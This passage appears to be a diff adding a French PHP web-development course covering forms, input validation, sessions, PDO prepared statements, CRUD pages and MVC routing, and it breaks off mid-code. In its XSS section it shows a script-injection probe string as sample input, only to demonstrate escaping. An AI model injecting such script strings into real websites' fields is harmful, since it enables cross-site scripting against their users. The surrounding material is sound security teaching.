+            <input type="text" id="nom" name="nom"
+                   value="<?= htmlspecialchars($nom) ?>" required>
+        </div>
+        <div>
+            <label for="email">Email :</label>
+            <input type="email" id="email" name="email"
+                   value="<?= htmlspecialchars($email) ?>" required>
+        </div>
+        <div>
+            <label for="age">Age :</label>
+            <input type="number" id="age" name="age" min="16" max="120" required>
+        </div>
+        <button type="submit">S'inscrire</button>
+    </form>
+</body>
+</html>
+```
+
+### 6.3 Validation et sanitization
+
+**htmlspecialchars -- protection contre XSS :**
+
+```php
+<?php
+$input = '<script>alert("XSS")</script>';
+echo htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
+// &lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;
+```
+
+Cette fonction convertit les caracteres speciaux HTML en entites :
+- `<` devient `&lt;`
+- `>` devient `&gt;`
+- `"` devient `&quot;`
+- `'` devient `&#039;`
+- `&` devient `&amp;`
+
+**filter_input et filter_var :**
+
+```php
+<?php
+// filter_input : filtre directement depuis la superglobale
+$email = filter_input(INPUT_POST, 'email', FILTER_VALIDATE_EMAIL);
+$age = filter_input(INPUT_POST, 'age', FILTER_VALIDATE_INT, [
+    'options' => ['min_range' => 1, 'max_range' => 120]
+]);
+
+// filter_var : filtre une variable existante
+$email = "test@example.com";
+if (filter_var($email, FILTER_VALIDATE_EMAIL) !== false) {
+    echo "Email valide";
+}
+
+// Sanitization
+$email = filter_var("  test@EXAMPLE.com  ", FILTER_SANITIZE_EMAIL);
+// "test@EXAMPLE.com"
+
+$entier = filter_var("42abc", FILTER_SANITIZE_NUMBER_INT);
+// "42"
+
+$url = filter_var("https://example.com/page?q=test", FILTER_VALIDATE_URL);
+```
+
+**Filtres de validation disponibles :**
+
+| Filtre | Verifie |
+|--------|---------|
+| `FILTER_VALIDATE_EMAIL` | Adresse email valide |
+| `FILTER_VALIDATE_INT` | Nombre entier |
+| `FILTER_VALIDATE_FLOAT` | Nombre decimal |
+| `FILTER_VALIDATE_URL` | URL valide |
+| `FILTER_VALIDATE_IP` | Adresse IP |
+| `FILTER_VALIDATE_BOOLEAN` | Valeur booleenne |
+| `FILTER_VALIDATE_DOMAIN` | Nom de domaine (PHP 7+) |
+
+### 6.4 Syntaxe alternative pour les templates
+
+PHP propose une syntaxe alternative aux accolades pour les structures de controle, plus lisible dans les templates HTML :
+
+```php
+<?php if ($condition): ?>
+    <p>Condition vraie</p>
+<?php elseif ($autreCondition): ?>
+    <p>Autre condition</p>
+<?php else: ?>
+    <p>Condition fausse</p>
+<?php endif; ?>
+
+<?php foreach ($items as $item): ?>
+    <li><?= htmlspecialchars($item) ?></li>
+<?php endforeach; ?>
+
+<?php for ($i = 0; $i < 10; $i++): ?>
+    <span><?= $i ?></span>
+<?php endfor; ?>
+
+<?php while ($condition): ?>
+    <p>Boucle</p>
+<?php endwhile; ?>
+```
+
+La balise `<?= $variable ?>` est un raccourci pour `<?php echo $variable; ?>`.
+
+---
+
+## 7. Sessions et cookies
+
+### 7.1 Sessions
+
+Une session permet de conserver des donnees utilisateur entre plusieurs pages. PHP genere un identifiant unique de session (PHPSESSID), stocke dans un cookie cote navigateur. Les donnees elles-memes sont stockees sur le serveur.
+
+```php
+<?php
+// TOUJOURS appeler session_start() en debut de script
+// Avant tout output HTML (y compris espaces et BOM)
+session_start();
+
+// Stocker des donnees
+$_SESSION['user_id'] = 42;
+$_SESSION['username'] = 'alice';
+$_SESSION['role'] = 'admin';
+$_SESSION['panier'] = [];
+
+// Lire des donnees
+if (isset($_SESSION['username'])) {
+    echo "Connecte en tant que " . $_SESSION['username'];
+}
+
+// Supprimer une donnee
+unset($_SESSION['panier']);
+
+// Destruction complete
+session_unset();    // Vide toutes les variables de session
+session_destroy();  // Detruit la session sur le serveur
+```
+
+### 7.2 Cookies
+
+Un cookie est un petit fichier texte stocke dans le navigateur du client. Il est envoye au serveur a chaque requete HTTP.
+
+```php
+<?php
+// Syntaxe : setcookie(nom, valeur, expiration, chemin, domaine, secure, httponly)
+// Doit etre appele AVANT tout output HTML
+
+// Cookie qui expire dans 30 jours
+setcookie("langue", "fr", time() + 3600 * 24 * 30, "/");
+
+// Cookie securise (HTTPS uniquement, inaccessible en JavaScript)
+setcookie("token", "abc123", [
+    'expires' => time() + 3600,
+    'path' => '/',
+    'domain' => '',
+    'secure' => true,     // HTTPS uniquement
+    'httponly' => true,    // Inaccessible en JavaScript
+    'samesite' => 'Strict' // Protection CSRF
+]);
+
+// Lecture (disponible a la requete suivante)
+$langue = $_COOKIE['langue'] ?? 'fr';
+
+// Suppression
+setcookie("langue", "", time() - 3600, "/");
+```
+
+Difference session vs cookie :
+- **Session** : donnees sur le serveur, plus securise, expire a la fermeture du navigateur par defaut
+- **Cookie** : donnees sur le client, peut persister longtemps, limite a ~4Ko, visible par l'utilisateur
+
+### 7.3 Authentification basique avec sessions
+
+```php
+<?php
+// login.php
+session_start();
+
+$erreur = '';
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $email = trim($_POST['email'] ?? '');
+    $motdepasse = $_POST['motdepasse'] ?? '';
+
+    // Simulation : en pratique, requete en base de donnees
+    // Le mot de passe hache serait recupere depuis la BDD
+    $hashStocke = '$2y$10$abcdefghijklmnopqrstuuABCDEFGHIJKLMNOPQRSTUVWXYZ012';
+
+    // Verification du mot de passe
+    if ($email === 'admin@example.com' && password_verify($motdepasse, $hashStocke)) {
+        // Authentification reussie
+        $_SESSION['user_id'] = 1;
+        $_SESSION['username'] = 'admin';
+        $_SESSION['role'] = 'admin';
+
+        // Regenerer l'ID de session (securite)
+        session_regenerate_id(true);
+
+        header("Location: tableau-de-bord.php");
+        exit;
+    } else {
+        $erreur = "Identifiants incorrects";
+    }
+}
+?>
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <title>Connexion</title>
+</head>
+<body>
+    <h1>Connexion</h1>
+    <?php if ($erreur): ?>
+        <p style="color: red;"><?= htmlspecialchars($erreur) ?></p>
+    <?php endif; ?>
+    <form method="POST">
+        <label>Email : <input type="email" name="email" required></label><br>
+        <label>Mot de passe : <input type="password" name="motdepasse" required></label><br>
+        <button type="submit">Se connecter</button>
+    </form>
+</body>
+</html>
+```
+
+```php
+<?php
+// auth.php -- fichier de protection a inclure dans chaque page privee
+session_start();
+
+function estConnecte(): bool {
+    return isset($_SESSION['user_id']);
+}
+
+function estAdmin(): bool {
+    return isset($_SESSION['role']) && $_SESSION['role'] === 'admin';
+}
+
+function exigerConnexion(): void {
+    if (!estConnecte()) {
+        header("Location: login.php");
+        exit;
+    }
+}
+
+function exigerAdmin(): void {
+    exigerConnexion();
+    if (!estAdmin()) {
+        http_response_code(403);
+        echo "Acces interdit";
+        exit;
+    }
+}
+```
+
+```php
+<?php
+// tableau-de-bord.php
+require_once 'auth.php';
+exigerConnexion();
+?>
+<!DOCTYPE html>
+<html lang="fr">
+<head><meta charset="UTF-8"><title>Tableau de bord</title></head>
+<body>
+    <h1>Bienvenue, <?= htmlspecialchars($_SESSION['username']) ?></h1>
+    <a href="deconnexion.php">Se deconnecter</a>
+</body>
+</html>
+```
+
+```php
+<?php
+// deconnexion.php
+session_start();
+$_SESSION = [];
+
+if (ini_get("session.use_cookies")) {
+    $params = session_get_cookie_params();
+    setcookie(session_name(), '', time() - 42000,
+        $params["path"], $params["domain"],
+        $params["secure"], $params["httponly"]
+    );
+}
+
+session_destroy();
+header("Location: login.php");
+exit;
+```
+
+---
+
+## 8. Programmation orientee objet en PHP
+
+### 8.1 Classes et objets
+
+```php
+<?php
+class Produit {
+    // Proprietes (attributs)
+    private string $nom;
+    private float $prix;
+    private int $stock;
+
+    // Constructeur
+    public function __construct(string $nom, float $prix, int $stock = 0) {
+        $this->nom = $nom;
+        $this->prix = $prix;
+        $this->stock = $stock;
+    }
+
+    // Getters
+    public function getNom(): string {
+        return $this->nom;
+    }
+
+    public function getPrix(): float {
+        return $this->prix;
+    }
+
+    public function getStock(): int {
+        return $this->stock;
+    }
+
+    // Setters
+    public function setPrix(float $prix): void {
+        if ($prix < 0) {
+            throw new InvalidArgumentException("Le prix ne peut pas etre negatif");
+        }
+        $this->prix = $prix;
+    }
+
+    // Methodes
+    public function estDisponible(): bool {
+        return $this->stock > 0;
+    }
+
+    public function getPrixTTC(float $tva = 0.20): float {
+        return $this->prix * (1 + $tva);
+    }
+
+    public function __toString(): string {
+        return "{$this->nom} - {$this->prix} EUR";
+    }
+}
+
+// Utilisation
+$produit = new Produit("Clavier", 49.99, 15);
+echo $produit->getNom();          // Clavier
+echo $produit->getPrixTTC();      // 59.988
+echo $produit->estDisponible();   // true
+echo $produit;                    // Clavier - 49.99 EUR
+```
+
+### 8.2 Visibilite
+
+| Mot-cle | Classe | Enfant | Exterieur |
+|---------|--------|--------|-----------|
+| `public` | oui | oui | oui |
+| `protected` | oui | oui | non |
+| `private` | oui | non | non |
+
+```php
+<?php
+class Exemple {
+    public string $publik = "accessible partout";
+    protected string $protege = "accessible dans la classe et ses enfants";
+    private string $prive = "accessible uniquement dans cette classe";
+
+    public function afficher(): void {
+        // Ici, les trois sont accessibles
+        echo $this->publik;
+        echo $this->protege;
+        echo $this->prive;
+    }
+}
+
+$obj = new Exemple();
+echo $obj->publik;   // OK
+// echo $obj->protege; // Erreur
+// echo $obj->prive;   // Erreur
+```
+
+### 8.3 Constructeur avec promotion de proprietes (PHP 8+)
+
+```php
+<?php
+// Syntaxe classique
+class UtilisateurClassique {
+    private string $nom;
+    private string $email;
+
+    public function __construct(string $nom, string $email) {
+        $this->nom = $nom;
+        $this->email = $email;
+    }
+}
+
+// Syntaxe avec promotion (PHP 8+)
+class Utilisateur {
+    public function __construct(
+        private string $nom,
+        private string $email,
+        private string $role = 'utilisateur'
+    ) {}
+
+    public function getNom(): string {
+        return $this->nom;
+    }
+
+    public function getEmail(): string {
+        return $this->email;
+    }
+}
+```
+
+### 8.4 Heritage
+
+```php
+<?php
+class Animal {
+    public function __construct(
+        protected string $nom,
+        protected int $age
+    ) {}
+
+    public function parler(): string {
+        return "...";
+    }
+
+    public function sePresenter(): string {
+        return "Je suis {$this->nom}, j'ai {$this->age} ans";
+    }
+}
+
+class Chien extends Animal {
+    public function __construct(
+        string $nom,
+        int $age,
+        private string $race
+    ) {
+        parent::__construct($nom, $age);
+    }
+
+    // Redefinition (override)
+    public function parler(): string {
+        return "Ouaf !";
+    }
+
+    public function getRace(): string {
+        return $this->race;
+    }
+}
+
+class Chat extends Animal {
+    public function parler(): string {
+        return "Miaou !";
+    }
+}
+
+$chien = new Chien("Rex", 5, "Berger");
+echo $chien->sePresenter(); // Je suis Rex, j'ai 5 ans
+echo $chien->parler();      // Ouaf !
+echo $chien->getRace();     // Berger
+
+$chat = new Chat("Minou", 3);
+echo $chat->parler();       // Miaou !
+```
+
+### 8.5 Classes et methodes abstraites
+
+```php
+<?php
+abstract class Forme {
+    abstract public function aire(): float;
+    abstract public function perimetre(): float;
+
+    // Methode concrete (non abstraite)
+    public function afficher(): string {
+        return "Aire: " . $this->aire() . ", Perimetre: " . $this->perimetre();
+    }
+}
+
+class Rectangle extends Forme {
+    public function __construct(
+        private float $largeur,
+        private float $hauteur
+    ) {}
+
+    public function aire(): float {
+        return $this->largeur * $this->hauteur;
+    }
+
+    public function perimetre(): float {
+        return 2 * ($this->largeur + $this->hauteur);
+    }
+}
+
+class Cercle extends Forme {
+    public function __construct(
+        private float $rayon
+    ) {}
+
+    public function aire(): float {
+        return M_PI * $this->rayon ** 2;
+    }
+
+    public function perimetre(): float {
+        return 2 * M_PI * $this->rayon;
+    }
+}
+
+// $forme = new Forme(); // Erreur : classe abstraite
+$rect = new Rectangle(5, 3);
+echo $rect->afficher(); // Aire: 15, Perimetre: 16
+```
+
+### 8.6 Interfaces
+
+```php
+<?php
+interface Exportable {
+    public function toJSON(): string;
+    public function toCSV(): string;
+}
+
+interface Affichable {
+    public function afficher(): string;
+}
+
+class Etudiant implements Exportable, Affichable {
+    public function __construct(
+        private string $nom,
+        private float $moyenne
+    ) {}
+
+    public function toJSON(): string {
+        return json_encode([
+            'nom' => $this->nom,
+            'moyenne' => $this->moyenne
+        ]);
+    }
+
+    public function toCSV(): string {
+        return "{$this->nom};{$this->moyenne}";
+    }
+
+    public function afficher(): string {
+        return "{$this->nom} (moyenne: {$this->moyenne})";
+    }
+}
+```
+
+Difference entre classe abstraite et interface :
+- Une classe ne peut heriter que d'une seule classe abstraite mais peut implementer plusieurs interfaces
+- Une classe abstraite peut contenir des methodes concretes et des proprietes ; une interface ne definit que des signatures de methodes (et des constantes)
+- Une classe abstraite peut avoir des proprietes avec une visibilite quelconque ; une interface ne peut avoir que des methodes publiques
+
+### 8.7 Proprietes et methodes statiques
+
+```php
+<?php
+class Compteur {
+    private static int $count = 0;
+
+    public function __construct() {
+        self::$count++;
+    }
+
+    public static function getCount(): int {
+        return self::$count;
+    }
+
+    public static function reset(): void {
+        self::$count = 0;
+    }
+}
+
+new Compteur();
+new Compteur();
+new Compteur();
+echo Compteur::getCount(); // 3
+```
+
+### 8.8 Constantes de classe
+
+```php
+<?php
+class Config {
+    public const VERSION = "2.0.0";
+    public const MAX_TENTATIVES = 5;
+    public const ROLES = ['admin', 'editeur', 'utilisateur'];
+}
+
+echo Config::VERSION;          // 2.0.0
+echo Config::MAX_TENTATIVES;   // 5
+```
+
+### 8.9 Autoload avec spl_autoload_register
+
+L'autoload charge automatiquement les fichiers de classes lorsqu'elles sont utilisees pour la premiere fois, evitant les `require` manuels.
+
+```php
+<?php
+// autoload.php
+spl_autoload_register(function (string $classe): void {
+    // Convertir les backslashes de namespace en separateurs de dossier
+    $fichier = __DIR__ . '/classes/' . str_replace('\\', '/', $classe) . '.php';
+
+    if (file_exists($fichier)) {
+        require_once $fichier;
+    }
+});
+```
+
+Structure de dossiers :
+
+```
+projet/
+  autoload.php
+  index.php
+  classes/
+    Produit.php
+    Utilisateur.php
+    Models/
+      ProduitModel.php
+```
+
+```php
+<?php
+// index.php
+require_once 'autoload.php';
+
+$produit = new Produit("Clavier", 49.99);
+// PHP appelle automatiquement l'autoloader
+// qui charge classes/Produit.php
+```
+
+En pratique avec Composer (gestionnaire de dependances PHP), l'autoload est genere automatiquement :
+
+```json
+{
+    "autoload": {
+        "psr-4": {
+            "App\\": "src/"
+        }
+    }
+}
+```
+
+```bash
+composer dump-autoload
+```
+
+```php
+<?php
+require_once 'vendor/autoload.php';
+
+$obj = new App\Models\Produit("Clavier", 49.99);
+```
+
+---
+
+## 9. Connexion MySQL avec PDO
+
+### 9.1 Presentation de PDO
+
+PDO (PHP Data Objects) est une couche d'abstraction pour acceder aux bases de donnees en PHP. Elle fournit une interface uniforme quel que soit le SGBD (MySQL, PostgreSQL, SQLite, etc.).
+
+Avantages de PDO :
+- Requetes preparees (protection contre les injections SQL)
+- Support de multiples SGBD
+- Gestion des exceptions
+- Interface orientee objet
+
+### 9.2 Etablir la connexion
+
+```php
+<?php
+$host = 'localhost';
+$dbname = 'ma_base';
+$user = 'root';
+$password = '';
+$charset = 'utf8mb4';
+
+// DSN (Data Source Name)
+$dsn = "mysql:host=$host;dbname=$dbname;charset=$charset";
+
+// Options recommandees
+$options = [
+    PDO::ATTR_ERRMODE            => PDO::ERRMODE_EXCEPTION,  // Lancer des exceptions
+    PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,        // Tableaux associatifs
+    PDO::ATTR_EMULATE_PREPARES   => false,                   // Requetes preparees natives
+];
+
+try {
+    $pdo = new PDO($dsn, $user, $password, $options);
+    echo "Connexion reussie";
+} catch (PDOException $e) {
+    // En production : logger l'erreur, ne pas l'afficher
+    die("Erreur de connexion : " . $e->getMessage());
+}
+```
+
+Explication des options :
+
+| Option | Valeur | Role |
+|--------|--------|------|
+| `ATTR_ERRMODE` | `ERRMODE_EXCEPTION` | Leve une exception en cas d'erreur SQL |
+| `ATTR_DEFAULT_FETCH_MODE` | `FETCH_ASSOC` | Retourne les resultats en tableaux associatifs |
+| `ATTR_EMULATE_PREPARES` | `false` | Utilise les vraies requetes preparees du SGBD |
+
+### 9.3 Classe de connexion reutilisable
+
+```php
+<?php
+// Database.php
+class Database {
+    private static ?PDO $instance = null;
+
+    public static function getInstance(): PDO {
+        if (self::$instance === null) {
+            $dsn = "mysql:host=localhost;dbname=ma_base;charset=utf8mb4";
+            $options = [
+                PDO::ATTR_ERRMODE            => PDO::ERRMODE_EXCEPTION,
+                PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
+                PDO::ATTR_EMULATE_PREPARES   => false,
+            ];
+
+            try {
+                self::$instance = new PDO($dsn, 'root', '', $options);
+            } catch (PDOException $e) {
+                die("Erreur de connexion : " . $e->getMessage());
+            }
+        }
+
+        return self::$instance;
+    }
+
+    // Empecher le clonage et la deserialisation
+    private function __construct() {}
+    private function __clone() {}
+}
+
+// Utilisation
+$pdo = Database::getInstance();
+```
+
+Ce pattern Singleton garantit qu'une seule connexion est ouverte durant l'execution du script.
+
+---
+
+## 10. Requetes preparees
+
+Les requetes preparees sont **obligatoires** pour toute requete impliquant des donnees utilisateur. Elles protegent contre les injections SQL en separant la structure de la requete et les donnees.
+
+### 10.1 Principe
+
+```
+Etape 1 : prepare()  → Le SGBD analyse et compile la requete avec des marqueurs
+Etape 2 : execute()  → Le SGBD recoit les valeurs et les injecte en securite
+```
+
+### 10.2 Marqueurs nommes
+
+```php
+<?php
+$pdo = Database::getInstance();
+
+// Prepare la requete avec des marqueurs nommes (:nom)
+$stmt = $pdo->prepare("SELECT * FROM utilisateurs WHERE email = :email AND actif = :actif");
+
+// Execute avec les valeurs
+$stmt->execute([
+    ':email' => 'alice@example.com',
+    ':actif' => 1
+]);
+
+// Recuperer les resultats
+$utilisateur = $stmt->fetch(); // Une seule ligne
+```
+
+### 10.3 Marqueurs positionnels
+
+```php
+<?php
+$stmt = $pdo->prepare("SELECT * FROM utilisateurs WHERE email = ? AND actif = ?");
+$stmt->execute(['alice@example.com', 1]);
+$utilisateur = $stmt->fetch();
+```
+
+Les marqueurs nommes (`:nom`) sont recommandes pour leur lisibilite.
+
+### 10.4 bindParam vs bindValue
+
+```php
+<?php
+$stmt = $pdo->prepare("SELECT * FROM produits WHERE prix > :min AND prix < :max");
+
+// bindValue : lie une VALEUR (evaluee immediatement)
+$stmt->bindValue(':min', 10, PDO::PARAM_INT);
+$stmt->bindValue(':max', 50, PDO::PARAM_INT);
+$stmt->execute();
+
+// bindParam : lie une REFERENCE a une variable (evaluee a l'execute)
+$min = 10;
+$max = 50;
+$stmt->bindParam(':min', $min, PDO::PARAM_INT);
+$stmt->bindParam(':max', $max, PDO::PARAM_INT);
+
+$min = 20; // Change AVANT execute
+$stmt->execute();
+// La requete utilise min=20, max=50
+```
+
+Types PDO pour bindParam/bindValue :
+
+| Constante | Type |
+|-----------|------|
+| `PDO::PARAM_STR` | Chaine (defaut) |
+| `PDO::PARAM_INT` | Entier |
+| `PDO::PARAM_BOOL` | Booleen |
+| `PDO::PARAM_NULL` | NULL |
+
+### 10.5 Recuperation des resultats
+
+```php
+<?php
+$stmt = $pdo->prepare("SELECT * FROM produits WHERE categorie = :cat");
+$stmt->execute([':cat' => 'informatique']);
+
+// fetch() : une seule ligne
+$produit = $stmt->fetch();
+// ['id' => 1, 'nom' => 'Clavier', 'prix' => 49.99, ...]
+
+// fetchAll() : toutes les lignes
+$stmt->execute([':cat' => 'informatique']);
+$produits = $stmt->fetchAll();
+// [['id' => 1, ...], ['id' => 2, ...], ...]
+
+// fetchColumn() : une seule colonne
+$stmt = $pdo->prepare("SELECT COUNT(*) FROM produits WHERE categorie = :cat");
+$stmt->execute([':cat' => 'informatique']);
+$nombre = $stmt->fetchColumn();
+// 42
+
+// Modes de fetch
+$stmt->fetch(PDO::FETCH_ASSOC);  // Tableau associatif (defaut si configure)
+$stmt->fetch(PDO::FETCH_NUM);    // Tableau indexe
+$stmt->fetch(PDO::FETCH_OBJ);    // Objet stdClass
+$stmt->fetch(PDO::FETCH_BOTH);   // Associatif + indexe
+
+// Fetch en objet de classe
+$stmt->setFetchMode(PDO::FETCH_CLASS, Produit::class);
+$produit = $stmt->fetch(); // Instance de Produit
+
+// fetchAll avec FETCH_CLASS
+$produits = $stmt->fetchAll(PDO::FETCH_CLASS, Produit::class);
+
+// Parcours ligne par ligne (pour les gros resultats)
+$stmt = $pdo->prepare("SELECT * FROM produits");
+$stmt->execute();
+while ($produit = $stmt->fetch()) {
+    echo $produit['nom'] . "<br>";
+}
+```
+
+### 10.6 Nombre de lignes affectees
+
+```php
+<?php
+$stmt = $pdo->prepare("UPDATE produits SET prix = prix * 1.10 WHERE categorie = :cat");
+$stmt->execute([':cat' => 'alimentaire']);
+
+echo $stmt->rowCount(); // Nombre de lignes modifiees
+```
+
+---
+
+## 11. CRUD complet avec PDO
+
+Pour les exemples suivants, on utilise la table :
+
+```sql
+CREATE TABLE produits (
+    id INT AUTO_INCREMENT PRIMARY KEY,
+    nom VARCHAR(100) NOT NULL,
+    description TEXT,
+    prix DECIMAL(10,2) NOT NULL,
+    stock INT NOT NULL DEFAULT 0,
+    categorie VARCHAR(50),
+    date_creation DATETIME DEFAULT CURRENT_TIMESTAMP,
+    actif TINYINT(1) DEFAULT 1
+) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
+```
+
+### 11.1 CREATE (INSERT)
+
+```php
+<?php
+$pdo = Database::getInstance();
+
+// Insertion simple
+$stmt = $pdo->prepare("
+    INSERT INTO produits (nom, description, prix, stock, categorie)
+    VALUES (:nom, :description, :prix, :stock, :categorie)
+");
+
+$stmt->execute([
+    ':nom' => 'Clavier mecanique',
+    ':description' => 'Clavier mecanique switches Cherry MX',
+    ':prix' => 89.99,
+    ':stock' => 25,
+    ':categorie' => 'peripheriques'
+]);
+
+// Recuperer l'ID genere
+$id = $pdo->lastInsertId();
+echo "Produit insere avec l'ID : $id";
+```
+
+**Insertion multiple :**
+
+```php
+<?php
+$produits = [
+    ['Souris sans fil', 'Souris ergonomique Bluetooth', 34.99, 50, 'peripheriques'],
+    ['Ecran 27 pouces', 'Ecran IPS 4K', 349.99, 10, 'ecrans'],
+    ['Casque audio', 'Casque sans fil reduction de bruit', 79.99, 30, 'audio'],
+];
+
+$stmt = $pdo->prepare("
+    INSERT INTO produits (nom, description, prix, stock, categorie)
+    VALUES (?, ?, ?, ?, ?)
+");
+
+$pdo->beginTransaction();
+try {
+    foreach ($produits as $produit) {
+        $stmt->execute($produit);
+    }
+    $pdo->commit();
+    echo "Tous les produits ont ete inseres";
+} catch (PDOException $e) {
+    $pdo->rollBack();
+    echo "Erreur : " . $e->getMessage();
+}
+```
+
+### 11.2 READ (SELECT)
+
+```php
+<?php
+// Tous les produits actifs
+$stmt = $pdo->prepare("SELECT * FROM produits WHERE actif = 1 ORDER BY nom");
+$stmt->execute();
+$produits = $stmt->fetchAll();
+
+// Un produit par ID
+$stmt = $pdo->prepare("SELECT * FROM produits WHERE id = :id");
+$stmt->execute([':id' => 5]);
+$produit = $stmt->fetch();
+
+if ($produit === false) {
+    echo "Produit non trouve";
+} else {
+    echo $produit['nom'];
+}
+
+// Recherche par mot-cle
+$stmt = $pdo->prepare("SELECT * FROM produits WHERE nom LIKE :recherche OR description LIKE :recherche");
+$recherche = '%' . $motcle . '%';
+$stmt->execute([':recherche' => $recherche]);
+$resultats = $stmt->fetchAll();
+
+// Compter les resultats
+$stmt = $pdo->prepare("SELECT COUNT(*) FROM produits WHERE categorie = :cat");
+$stmt->execute([':cat' => 'peripheriques']);
+$nombre = $stmt->fetchColumn();
+
+// Avec jointure
+$stmt = $pdo->prepare("
+    SELECT p.nom, p.prix, c.nom AS categorie_nom
+    FROM produits p
+    INNER JOIN categories c ON p.categorie_id = c.id
+    WHERE p.actif = 1
+    ORDER BY p.prix DESC
+");
+$stmt->execute();
+$resultats = $stmt->fetchAll();
+```
+
+### 11.3 UPDATE
+
+```php
+<?php
+// Mise a jour d'un produit
+$stmt = $pdo->prepare("
+    UPDATE produits
+    SET nom = :nom, prix = :prix, stock = :stock
+    WHERE id = :id
+");
+
+$stmt->execute([
+    ':nom' => 'Clavier mecanique RGB',
+    ':prix' => 99.99,
+    ':stock' => 20,
+    ':id' => 1
+]);
+
+echo $stmt->rowCount() . " ligne(s) modifiee(s)";
+
+// Decrementer le stock (commande)
+$stmt = $pdo->prepare("
+    UPDATE produits
+    SET stock = stock - :quantite
+    WHERE id = :id AND stock >= :quantite
+");
+
+$stmt->execute([':quantite' => 1, ':id' => 5]);
+
+if ($stmt->rowCount() === 0) {
+    echo "Stock insuffisant ou produit introuvable";
+}
+```
+
+### 11.4 DELETE
+
+```php
+<?php
+// Suppression physique
+$stmt = $pdo->prepare("DELETE FROM produits WHERE id = :id");
+$stmt->execute([':id' => 10]);
+
+echo $stmt->rowCount() . " produit(s) supprime(s)";
+
+// Suppression logique (soft delete) - recommandee
+$stmt = $pdo->prepare("UPDATE produits SET actif = 0 WHERE id = :id");
+$stmt->execute([':id' => 10]);
+```
+
+### 11.5 Exemple CRUD complet (formulaire)
+
+```php
+<?php
+// produits.php - Liste et gestion CRUD
+require_once 'Database.php';
+
+$pdo = Database::getInstance();
+$message = '';
+
+// Traitement des actions
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $action = $_POST['action'] ?? '';
+
+    if ($action === 'ajouter') {
+        $stmt = $pdo->prepare("
+            INSERT INTO produits (nom, prix, stock, categorie)
+            VALUES (:nom, :prix, :stock, :categorie)
+        ");
+        $stmt->execute([
+            ':nom' => trim($_POST['nom']),
+            ':prix' => (float) $_POST['prix'],
+            ':stock' => (int) $_POST['stock'],
+            ':categorie' => trim($_POST['categorie']),
+        ]);
+        $message = "Produit ajoute avec succes";
+    }
+
+    if ($action === 'supprimer') {
+        $stmt = $pdo->prepare("DELETE FROM produits WHERE id = :id");
+        $stmt->execute([':id' => (int) $_POST['id']]);
+        $message = "Produit supprime";
+    }
+
+    // Redirect After Post (PRG pattern)
+    header("Location: produits.php?msg=" . urlencode($message));
+    exit;
+}
+
+$message = $_GET['msg'] ?? '';
+
+// Lecture des produits
+$stmt = $pdo->prepare("SELECT * FROM produits WHERE actif = 1 ORDER BY nom");
+$stmt->execute();
+$produits = $stmt->fetchAll();
+?>
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <title>Gestion des produits</title>
+</head>
+<body>
+    <h1>Produits</h1>
+
+    <?php if ($message): ?>
+        <p style="color: green;"><?= htmlspecialchars($message) ?></p>
+    <?php endif; ?>
+
+    <h2>Ajouter un produit</h2>
+    <form method="POST">
+        <input type="hidden" name="action" value="ajouter">
+        <label>Nom : <input type="text" name="nom" required></label><br>
+        <label>Prix : <input type="number" name="prix" step="0.01" required></label><br>
+        <label>Stock : <input type="number" name="stock" required></label><br>
+        <label>Categorie : <input type="text" name="categorie"></label><br>
+        <button type="submit">Ajouter</button>
+    </form>
+
+    <h2>Liste des produits</h2>
+    <table border="1" cellpadding="5">
+        <thead>
+            <tr>
+                <th>ID</th>
+                <th>Nom</th>
+                <th>Prix</th>
+                <th>Stock</th>
+                <th>Categorie</th>
+                <th>Actions</th>
+            </tr>
+        </thead>
+        <tbody>
+            <?php foreach ($produits as $p): ?>
+            <tr>
+                <td><?= $p['id'] ?></td>
+                <td><?= htmlspecialchars($p['nom']) ?></td>
+                <td><?= number_format($p['prix'], 2, ',', ' ') ?> EUR</td>
+                <td><?= $p['stock'] ?></td>
+                <td><?= htmlspecialchars($p['categorie'] ?? '-') ?></td>
+                <td>
+                    <a href="modifier.php?id=<?= $p['id'] ?>">Modifier</a>
+                    <form method="POST" style="display:inline;"
+                          onsubmit="return confirm('Confirmer la suppression ?')">
+                        <input type="hidden" name="action" value="supprimer">
+                        <input type="hidden" name="id" value="<?= $p['id'] ?>">
+                        <button type="submit">Supprimer</button>
+                    </form>
+                </td>
+            </tr>
+            <?php endforeach; ?>
+        </tbody>
+    </table>
+</body>
+</html>
+```
+
+---
+
+## 12. Architecture MVC en PHP
+
+### 12.1 Principe
+
+Le patron MVC (Modele-Vue-Controleur) separe les responsabilites :
+
+- **Modele** : logique metier et acces aux donnees (requetes SQL via PDO)
+- **Vue** : presentation et affichage (HTML/CSS)
+- **Controleur** : traitement des requetes, coordination entre Modele et Vue
+
+```
+Navigateur  --->  Routeur  --->  Controleur
+                                    |
+                              Modele  <-->  Base de donnees
+                                    |
+                                   Vue  --->  Navigateur
+```
+
+### 12.2 Structure de dossiers
+
+```
+projet/
+  public/
+    index.php          <- Point d'entree unique (front controller)
+    css/
+    js/
+    images/
+  src/
+    Controllers/
+      ProduitController.php
+      UtilisateurController.php
+    Models/
+      Produit.php
+      Utilisateur.php
+    Views/
+      layout.php
+      produits/
+        index.php
+        show.php
+        create.php
+        edit.php
+      utilisateurs/
+        login.php
+  config/
+    database.php
+  .htaccess
+```
+
+### 12.3 Point d'entree et routage basique
+
+```apache
+# .htaccess (a la racine du projet)
+RewriteEngine On
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule ^(.*)$ public/index.php?url=$1 [QSA,L]
+```
+
+```php
+<?php
+// public/index.php - Front Controller
+require_once __DIR__ . '/../config/database.php';
+require_once __DIR__ . '/../src/autoload.php';
+
+// Recuperer l'URL demandee
+$url = trim($_GET['url'] ?? '', '/');
+$parties = explode('/', $url);
+
+// Routage simple
+$controleurNom = ucfirst($parties[0] ?? 'produit') . 'Controller';
+$action = $parties[1] ?? 'index';
+$parametre = $parties[2] ?? null;
+
+$fichierControleur = __DIR__ . "/../src/Controllers/$controleurNom.php";
+
+if (file_exists($fichierControleur)) {
